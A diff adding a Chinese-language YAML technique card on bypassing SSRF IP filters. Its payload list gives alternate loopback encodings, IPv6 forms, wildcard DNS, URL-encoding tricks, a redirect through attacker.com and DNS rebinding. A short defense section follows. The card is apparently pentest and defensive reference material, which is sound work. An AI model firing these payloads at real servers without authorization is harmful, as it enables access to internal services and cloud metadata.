@@ -1,0 +1,94 @@
+# 技术卡片: SSRF - IP 过滤绕过
+# 分类: ssrf / filter-bypass
+# 版本: 1.0
+# 日期: 2026-07-21
+# 来源: SecAtlas KB-SSRF-010 / HackTricks
+
+id: "ssrf-filter-bypass"
+name: "SSRF IP 过滤绕过（IPv6/十进制/DNS重绑定）"
+category: "ssrf"
+subcategory: "filter-bypass"
+severity: "high"
+
+description: |
+  SSRF 黑名单过滤覆盖不全，利用 IPv4 多种等效表示法、
+  IPv6 压缩格式、DNS 通配域名等绕过 IP 地址校验。
+
+trigger_signals:
+  - "127.0.0.1 被过滤但其他表示法未过滤"
+  - "正则/IP 黑名单仅覆盖常见格式"
+  - "DNS 解析后不做二次 IP 校验"
+  - "IPv6 支持但未过滤回环地址"
+
+payloads:
+
+ip_representations:
+  - format: "IPv4 十进制整数"
+    "127.0.0.1": "2130706433"
+    "10.0.0.1": "167772161"
+    usage: "url=http://2130706433:8080/admin"
+
+  - format: "IPv4 十六进制"
+    "127.0.0.1": "0x7f000001"
+    usage: "url=http://0x7f000001:8080/"
+
+  - format: "IPv4 八进制"
+    "127.0.0.1": "0177.0.0.1"
+    "127.0.0.1": "0177.00.00.01"
+    usage: "url=http://0177.0.0.1:8080/"
+
+  - format: "IPv6 回环"
+    "::1": "[::1]"
+    "127.0.0.1 映射": "[::ffff:127.0.0.1]"
+    usage: "url=http://[::1]:8080/admin"
+
+  - format: "IPv6 压缩"
+    "0:0:0:0:0:ffff:127.0.0.1": "[0:0:0:0:0:ffff:127.0.0.1]"
+    usage: "url=http://[0:0:0:0:0:ffff:127.0.0.1]:8080/"
+
+  - format: "DNS 通配服务"
+    "127.0.0.1 + xip.io": "127.0.0.1.xip.io"
+    "127.0.0.1 + nip.io": "127.0.0.1.nip.io"
+    usage: "url=http://127.0.0.1.xip.io:8080/admin"
+
+  - format: "URL 编码混淆"
+    "127.0.0.1": "%31%32%37%2e%30%2e%30%2e%31"
+    "double": "%252e%252e%252f"
+
+  - format: "localhost 字符串"
+    "localhost": "url=http://localhost:8080/"
+    "0.0.0.0": "url=http://0.0.0.0:8080/"
+    "0": "url=http://0:8080/"
+
+  - format: "URL 解析歧义"
+    "user:pass@host": "url=http://trusted.com@127.0.0.1:8080/"
+    "短链接": "url=https://bit.ly/xxx (重定向到内网)"
+    "302 重定向": "url=http://attacker.com/redirect?to=http://127.0.0.1/"
+
+  - format: "DNS Rebinding"
+    technique: "配置 TTL=0 域名交替返回合法 IP → 内网 IP"
+    tool: "rbndr / Singularity"
+    usage: "url=http://rebind.attacker.com:8080/"
+
+success_indicators:
+  - "不同 IP 表示法成功访问内网资源"
+  - "DNS 通配域名返回内网服务 Banner"
+  - "URL 编码绕过 WAF/过滤器"
+
+prerequisites:
+  - "SSRF 黑名单过滤不完整"
+  - "HTTP 客户端解析多种 IP 表示法"
+  - "DNS 可被外部控制（重绑定）"
+
+defense:
+  - "使用白名单而非黑名单"
+  - "DNS 解析后进行 IP 范围校验"
+  - "网络层出口过滤（正向代理强制执行）"
+  - "限制 HTTP 重定向跟随（逐跳校验）"
+  - "curl: 使用 CURLOPT_PROTOCOLS + 解析后 IP 校验"
+
+sources:
+  - kb: "KB-SSRF-010"
+  - ref: "OWASP: SSRF Bypass Techniques"
+  - ref: "PayloadsAllTheThings: SSRF Bypass"
+  - ref: "CWE-918"
